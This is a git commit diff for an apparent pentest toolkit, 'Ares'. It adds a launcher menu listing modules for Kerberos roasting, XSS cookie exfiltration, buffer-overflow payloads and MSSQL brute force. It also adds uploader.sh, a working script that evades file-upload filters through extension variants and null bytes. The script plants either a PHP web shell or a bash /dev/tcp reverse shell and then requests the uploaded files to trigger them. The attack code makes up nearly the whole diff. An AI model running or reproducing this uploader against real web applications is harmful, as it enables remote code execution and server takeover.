00ef0f4b002f66aef2e1bbba1344ecc7088247b6
Komodo <144389222+Komodo-pty@users.noreply.github.com>
2025-08-09 09:53:42 -0700

    Add files via upload
    Added Uploader module.
    
    Ares now also accepts arguments, & will only use an interactive prompt if a required argument is not provided.
    
    Subsequent updates will allow you to pass arguments to modules, instead of relying on interactive prompts.

--- ares.sh
+++ ares.sh
@@ -1,37 +1,102 @@
 #!/bin/bash
 
 path=$(readlink $(which ares) | awk -F 'ares.sh' '{print $1}')
-while true;
-do
-	echo -e "\nSelect an operation:\n[0] Exit\n[1] Active Directory Roasting\n[2] XSS\n[3] Wordlist Mutation\n[4] Buffer Overflow Payload Generator\n[5] MSSQL Brute Force\n"
-	read mode
+line="\n============================================================\n"
+target=""
 
-	if [ "$mode" == 0 ]
-	then
-		break
+Help()
+{
+	cat <<EOF
 
-	elif [ "$mode" == 1 ]
-	then
-		source "$path"ad_roasting.sh
+Ares will interactively prompt you for input unless you provide the necessary arguments for the selected module.
+	
+[Options]
+	-h: Show this help message
+	-m <MODULE>: Specify the module you want to use
 
-	elif [ "$mode" == 2 ]
-	then
-		python3 "$path"xss_cookie_thief.py
+[Modules]
+	upload: Bypass file upload defenses to get a backdoor on a Web App
+	roast: ASREP Roasting & Kerberoasting
+	xss: Setup for XSS cookie exfil
+	mutate: Wordlist mutation
+	bof: Buffer Overflow payload generator
+	mssql: Bruteforce MSSQL in Active Directory environment
 
-	elif [ "$mode" == 3 ]
-	then
-		source "$path"password_generator.sh
+EOF
+}
 
-	elif [ "$mode" == 4 ]
-	then
-		python3 "$path"BoF_payload.py
+if [ $# -eq 0 ]
+then
+  echo -e "$line\nNo arguments provided. Defaulting to interactive mode.\n\n[!] Tip: Use the -h argument to view the help menu\n"
+else
+  while getopts ":hm:" option
+  do
+    case $option in
+      h)
+        Help
+        exit
+	;;
 
-	elif [ "$mode" == 5 ]
-	then
-		source "$path"mssql_Brute.sh
+      m)
+        mode=$OPTARG
+	;;
+		
+      \?)
+         echo -e "\nError: Invalid argument"
+         exit
+	 ;;
+    esac
+  done
+fi
 
-	else
-		echo -e "\nYou did not select a valid option\n"
-	fi
+if [[ -z "$mode" ]]
+then
+  cat <<EOF
+[Modules]
+	[1] File Uploader
+	[2] Active Directory Roasting
+	[3] XSS
+	[4] Wordlist Mutation
+	[5] Buffer Overflow Payload Generator
+	[6] MSSQL Brute Force
 
-done
+EOF
+  read mode
+fi
+
+case "$mode" in
+
+  upload|1)
+    echo -e "$line\n[File Uploader]"
+    bash "$path"uploader.sh
+    ;;
+
+  roast|2)
+    echo -e "$line\n[Active Directory Roasting]"
+    bash "$path"ad_roasting.sh
+    ;;
+
+  xss|3)
+    echo -e "$line\n[XSS]"
+    python3 "$path"xss_cookie_thief.py
+    ;;
+
+  mutate|4)
+    echo -e "$line\n[Mutator]" 
+    bash "$path"password_generator.sh
+    ;;
+
+  bof|5)
+    echo -e "$line\n[Buffer Overflow]"
+    python3 "$path"BoF_payload.py
+    ;;
+
+  mssql|6)
+    echo -e "$line\n[Brute Force MSSQL]"
+    bash "$path"mssql_Brute.sh
+    ;;
+
+  *)
+    echo -e "\nYou did not select a valid option\n"
+    ;;
+esac
---
+++ uploader.sh
@@ -0,0 +1,199 @@
+#!/bin/bash
+
+line="\n============================================================\n"
+
+Help()
+{
+	cat <<EOF
+
+Uploader will run in interactive mode if you don't supply a value for required parameters
+
+[Options]
+	-h: Display this help message
+	-i <IP_Addres>: The IP Address to use for the Reverse Shell payload (i.e. your interface)
+	-p <PORT>: The port that your listener is running on
+	-u <URL>: The target URL that's used in POST Requests to upload a file
+	-n <NAME>: The 'name' attribute that's used in POST Requests (e.g. file for name="file")
+	-e <URL>: Exploit mode. Attempts to automatically trigger a Reverse Shell. Enter the URL where uploaded files are saved to.
+	-a <EXTENSION>: Allowed extension to use with Null Byte (defaults to jpg). Enter the extension without a period prepended.
+	-b: Basic payload instead of a Reverse Shell. Provide commands as the value of the 0 parameter (e.g. /evil.php?0=id) . Incompatible with -e
+
+[Example Usage]
+	./uploader.sh -i 12.345.67.89 -p 1337 -u http://10.10.40.117/panel/ -n fileUpload -e http://10.10.40.117/uploads/ -a png
+	./uploader.sh -u http://10.10.40.117/panel/ -n fileUpload -b
+EOF
+
+}
+
+if [ $# -eq 0 ]
+then
+        echo -e "\nNo arguments provided. Defaulting to interactive mode.\n\n[!] Tip: Use the -h argument to view the help menu\n"
+
+else
+	while getopts ":hi:p:u:n:e:a:b" option; do
+        	case $option in
+			h)
+                        	Help
+                                exit
+				;;
+			i)
+				ip=$OPTARG
+				;;
+			p)
+				port=$OPTARG
+				;;
+			u)
+				url=$OPTARG
+				;;
+			n)
+				form_field=$OPTARG
+				;;
+			e)
+				exploit=$OPTARG
+				;;
+			a)
+				allowed=$OPTARG
+				;;
+			b)
+#				payload='<?php if(isset($_REQUEST['"'"'0'"'"'])){echo "<pre>"; system($_REQUEST['"'"'0'"'"']); echo "</pre>"; die;} ?>'
+				payload='<?php if(isset($_REQUEST["0"])){echo "<pre>"; system($_REQUEST["0"]); echo "</pre>"; die;} ?>'
+				;;
+			\?)
+                                echo -e "\nError: Invalid argument"
+                                exit 1
+				;;
+                esac
+	done
+
+
+fi
+
+submit_field="submit"
+submit_value="Upload"
+
+if [[ -z "$url" ]]
+then
+	echo -e "\nEnter the target URL:\n"
+	read url
+fi
+
+if [[ -z "$form_field" ]]
+then
+	echo -e "\nLook at a valid POST Request for reference. What is the value of the name attribute? (e.g. file for name=\"file\"):\n"
+	read form_field
+fi
+
+if [[ -z "$allowed" ]]
+then
+	allowed="jpg"
+fi
+
+# PHP payload to send as the file content
+
+if [[ -z "$payload" ]]
+then
+
+	if [[ -z "$ip" ]]
+	then
+		echo -e "\n[Listing Detected Interfaces]\n"
+		ip -c a
+		echo -e "\nEnter your IP Address:\n"
+		read ip
+	fi
+
+	if [[ -z "$port" ]]
+	then
+		echo -e "\nEnter your listner's port:\n"
+		read port
+	fi
+
+	payload='<?php exec("/bin/bash -c '"'"'bash -i >& /dev/tcp/'"$ip"'/'"$port"' 0>&1'"'"'");?>'
+fi
+
+# Extensions to try
+extensions=(php php3 php4 php5 php7 pht phps phar phpt pgif phtml phtm inc)
+
+# Function to upload a given filename
+upload_file() {
+	local filename="$1"
+	local boundary="------------------------$(date +%s%N | sha256sum | cut -c1-29)"
+
+	echo "[*] Uploading: $filename"
+
+	curl -s -X POST "$url" \
+		-H "Content-Type: multipart/form-data; boundary=$boundary" \
+		--data-binary @<(cat <<EOF
+--$boundary
+Content-Disposition: form-data; name="$form_field"; filename="$filename"
+Content-Type: application/php
+
+$payload
+--$boundary
+Content-Disposition: form-data; name="$submit_field"
+
+$submit_value
+--$boundary--
+EOF
+)
+}
+
+# Upload with normal extensions
+for ext in "${extensions[@]}"; do
+	filename="testfile.$ext"
+	upload_file "$filename"	
+	echo -e "$line"
+
+	ext_upper=$(echo -n "$ext" | tr '[:lower:]' '[:upper:]')
+	filename="testfile.$ext_upper"
+	upload_file "$filename"	
+	echo -e "$line"
+done
+
+# Upload with null byte appended (percent-encoded %00)
+for ext in "${extensions[@]}"; do
+	filename="testfile.$ext%00.$allowed"
+	upload_file "$filename"
+	echo -e "$line"
+
+	ext_upper=$(echo -n "$ext" | tr '[:lower:]' '[:upper:]')
+	filename="testfile.$ext_upper%00.$allowed"
+	upload_file "$filename"	
+	echo -e "$line"
+done
+
+if [[ -n "$exploit" ]]
+then
+	for ext in "${extensions[@]}"; do
+		exploit="${exploit%/}"
+		
+		filename="testfile.$ext"
+		evil="$exploit"/"$filename"
+		echo -e "$line\n[*] Visiting: $evil\n"
+		curl $evil
+		echo -e "$line"
+
+		ext_upper=$(echo -n "$ext" | tr '[:lower:]' '[:upper:]')
+		filename="testfile.$ext_upper"
+		evil="$exploit"/"$filename"
+		echo -e "$line\n[*] Visiting: $evil\n"
+		curl $evil
+		echo -e "$line"
+
+		filename="testfile.$ext%00.$allowed"
+		evil="$exploit"/"$filename"
+		echo -e "$line\n[*] Visiting: $evil\n"
+		curl $evil
+		echo -e "$line"
+
+		filename="testfile.$ext_upper%00.$allowed"
+		evil="$exploit"/"$filename"
+		echo -e "$line\n[*] Visiting: $evil\n"
+		curl $evil
+		echo -e "$line"
+
+
+
+	done
+else
+	exit 0
+fi
